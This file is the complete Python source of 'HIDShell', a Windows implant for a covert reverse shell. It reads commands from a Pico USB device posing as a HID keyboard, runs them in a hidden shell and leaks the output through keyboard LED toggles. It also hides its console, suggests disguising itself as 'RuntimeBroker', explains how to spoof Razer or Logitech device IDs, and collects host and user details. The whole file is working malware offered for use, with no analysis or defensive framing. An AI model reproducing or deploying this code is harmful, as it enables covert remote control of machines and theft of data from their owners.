"""
HIDShell — implant.py
Windows agent for covert HID reverse shell.

Reads commands from the Pico's vendor HID interface, executes them,
and sends output back via keyboard LED toggles. Works identically
with both wired (Pico) and WiFi (Pico W) C2 devices.

No network connections. No files on disk. No IPC channels.
All communication travels through the USB HID subsystem.

Dependencies:
    pip install hidapi

Stealth run:
    pythonw implant.py

Compile to standalone:
    pyinstaller --onefile --noconsole --name RuntimeBroker implant.py
"""

import ctypes
import ctypes.wintypes
import subprocess
import threading
import time
import sys
import os

try:
    import hid
except ImportError:
    sys.exit(1)

# ─── Configuration ───────────────────────────────────────────────────────────
# Update VID/PID to match your board or spoof a target keyboard.
#
#   Pico / Pico W:    VID=0x239A  PID=0x80F4
#   Spoof Razer:      VID=0x1532  PID=0x02A2
#   Spoof Logitech:   VID=0x046D  PID=0xC52B
#
# Enumerate your device:
#   python -c "import hid;[print('0x%04X 0x%04X %s'%(d['vendor_id'],d['product_id'],d.get('product_string','?'))) for d in hid.enumerate() if d['usage_page'] in (0xFF00,0xFF)]"

VENDOR_ID  = 0x239A
PRODUCT_ID = 0x80F4

# Vendor HID usage page — CP 7.x exposes 0xFF, CP 9.x may expose 0xFF00.
# The agent tries both automatically.
TARGET_USAGE_PAGES = (0xFF00, 0xFF, 0x00FF)
TARGET_USAGE       = 0x01

# LED timing (seconds)
BIT_DELAY  = 0.02     # Between LED toggles — lower = faster but riskier
BYTE_DELAY = 0.005    # Extra settle time after byte commit

# Protocol
FRAME_STX  = 0x02
FRAME_ETX  = 0x03
REPORT_ID  = 0x04     # Must match boot.py report_ids

FLAG_START = 0x01
FLAG_END   = 0x02
FLAG_DATA  = 0x04

# Execution
CMD_TIMEOUT = 30      # Max seconds per command
MAX_OUTPUT  = 4096    # Truncate output to this (LED channel is slow)

# Behaviour
STEALTH      = True   # Hide console window on launch
RECONNECT    = True   # Auto-reconnect if device is unplugged
POLL_RATE    = 0.01   # Main loop sleep (seconds)
DEBUG        = False  # Print debug info (disable for deployment)

# ─── Windows API ─────────────────────────────────────────────────────────────

user32   = ctypes.windll.user32
kernel32 = ctypes.windll.kernel32

VK_NUMLOCK    = 0x90
VK_CAPSLOCK   = 0x14
VK_SCROLLLOCK = 0x91

KEYEVENTF_EXTENDEDKEY = 0x0001
KEYEVENTF_KEYUP       = 0x0002

_toggle_lock = threading.Lock()


def _toggle(vk):
    user32.keybd_event(vk, 0x45, KEYEVENTF_EXTENDEDKEY, 0)
    user32.keybd_event(vk, 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0)


# ─── LED Transmitter ─────────────────────────────────────────────────────────

class Transmitter:
    """Encodes and sends data via keyboard LED toggles."""

    __slots__ = ('_bd', '_byd')

    def __init__(self, bit_delay=BIT_DELAY, byte_delay=BYTE_DELAY):
        self._bd = bit_delay
        self._byd = byte_delay

    def _byte(self, val):
        bd = self._bd
        for i in range(7, -1, -1):
            _toggle(VK_NUMLOCK if (val >> i) & 1 else VK_CAPSLOCK)
            time.sleep(bd)
        _toggle(VK_SCROLLLOCK)
        time.sleep(bd + self._byd)

    def send(self, data):
        if isinstance(data, str):
            data = data.encode("utf-8", "replace")
        with _toggle_lock:
            self._byte(FRAME_STX)
            for b in data:
                self._byte(b)
            self._byte(FRAME_ETX)

    def update_timing(self, bit_delay_ms):
        self._bd = bit_delay_ms / 1000.0


# ─── HID Receiver ────────────────────────────────────────────────────────────

class Receiver:
    """Reads commands from the C2 device's vendor HID interface."""

    __slots__ = ('_vid', '_pid', '_dev', '_buf', 'connected')

    def __init__(self, vid=VENDOR_ID, pid=PRODUCT_ID):
        self._vid = vid
        self._pid = pid
        self._dev = None
        self._buf = bytearray()
        self.connected = False

    def connect(self):
        try:
            for info in hid.enumerate(self._vid, self._pid):
                if info.get("usage_page") in TARGET_USAGE_PAGES and info.get("usage") == TARGET_USAGE:
                    dev = hid.device()
                    dev.open_path(info["path"])
                    dev.set_nonblocking(True)
                    self._dev = dev
                    self.connected = True
                    if DEBUG:
                        print(f"[+] Connected: {info.get('product_string', '?')}")
                    return True
        except Exception:
            pass
        return False

    def disconnect(self):
        if self._dev:
            try:
                self._dev.close()
            except Exception:
                pass
        self._dev = None
        self.connected = False
        self._buf = bytearray()

    def reconnect(self):
        self.disconnect()
        return self.connect()

    def read(self):
        if not self.connected or self._dev is None:
            return None
        try:
            report = self._dev.read(64)
        except Exception:
            self.connected = False
            return None
        if not report or len(report) < 2:
            return None

        flags   = report[0]
        length  = report[1]
        payload = report[2:2 + length]

        # Single-report command (most common path)
        if (flags & FLAG_START) and (flags & FLAG_END):
            return bytes(payload).decode("utf-8", "replace")

        # Multi-report: accumulate chunks
        if flags & FLAG_START:
            self._buf = bytearray(payload)
        elif flags & FLAG_DATA:
            self._buf.extend(payload)

        if flags & FLAG_END:
            if flags & FLAG_DATA and not (flags & FLAG_START):
                self._buf.extend(payload)
            cmd = bytes(self._buf).decode("utf-8", "replace")
            self._buf = bytearray()
            return cmd

        return None


# ─── Executor ────────────────────────────────────────────────────────────────

class Executor:
    """Runs commands and returns output."""

    __slots__ = ('_tx',)

    def __init__(self, transmitter):
        self._tx = transmitter

    def run(self, cmd):
        cmd = cmd.strip()
        if not cmd:
            return ""

        # ── Built-ins ────────────────────────────────────────────────

        if cmd == "__PING__":
            return "__PONG__"

        if cmd == "__INFO__":
            g = os.environ.get
            return (
                f"host:{g('COMPUTERNAME', '?')}\n"
                f"user:{g('USERNAME', '?')}\n"
                f"domain:{g('USERDOMAIN', '?')}\n"
                f"os:{g('OS', '?')}\n"
                f"arch:{g('PROCESSOR_ARCHITECTURE', '?')}\n"
                f"pid:{os.getpid()}"
            )

        if cmd == "__EXIT__":
            return "__BYE__"

        # Adjust LED speed on the fly: __SPEED__30__
        if cmd.startswith("__SPEED__"):
            try:
                ms = int(cmd.replace("__SPEED__", "").strip("_"))
                self._tx.update_timing(ms)
                return f"BIT_DELAY={ms}ms"
            except Exception:
                return "(invalid speed value)"

        # ── Shell command ────────────────────────────────────────────

        try:
            r = subprocess.run(
                cmd,
                shell=True,
                capture_output=True,
                text=True,
                timeout=CMD_TIMEOUT,
                creationflags=subprocess.CREATE_NO_WINDOW,
            )
            out = r.stdout
            if r.stderr:
                out += r.stderr
            if not out:
                return "(no output)"
            return out[:MAX_OUTPUT]
        except subprocess.TimeoutExpired:
            return f"(timeout after {CMD_TIMEOUT}s)"
        except Exception as e:
            return f"(error: {e})"


# ─── Stealth ─────────────────────────────────────────────────────────────────

def hide():
    try:
        hwnd = kernel32.GetConsoleWindow()
        if hwnd:
            user32.ShowWindow(hwnd, 0)
    except Exception:
        pass


# ─── Main ────────────────────────────────────────────────────────────────────

def main():
    if STEALTH and not DEBUG:
        hide()

    tx = Transmitter()
    rx = Receiver()
    ex = Executor(tx)

    # Wait for C2 device with exponential backoff
    if DEBUG:
        print("[*] Searching for C2 device...")

    backoff = 1.0
    while not rx.connect():
        time.sleep(backoff)
        backoff = min(backoff * 1.5, 30.0)

    if DEBUG:
        print("[*] Agent ready — waiting for commands")

    backoff = 1.0

    while True:
        # Reconnect if disconnected
        if not rx.connected:
            if not RECONNECT:
                break
            time.sleep(backoff)
            if rx.reconnect():
                backoff = 1.0
                if DEBUG:
                    print("[*] Reconnected")
            else:
                backoff = min(backoff * 1.5, 30.0)
                continue

        # Poll for command
        cmd = rx.read()
        if cmd:
            if DEBUG:
                print(f"[RX] {cmd}")

            output = ex.run(cmd)

            # Handle exit
            if cmd.strip() == "__EXIT__":
                tx.send(output)
                time.sleep(0.5)
                rx.disconnect()
                return

            # Transmit response via LED channel
            if output:
                if DEBUG:
                    print(f"[TX] {len(output)} bytes")
                tx.send(output)

        time.sleep(POLL_RATE)


if __name__ == "__main__":
    main()
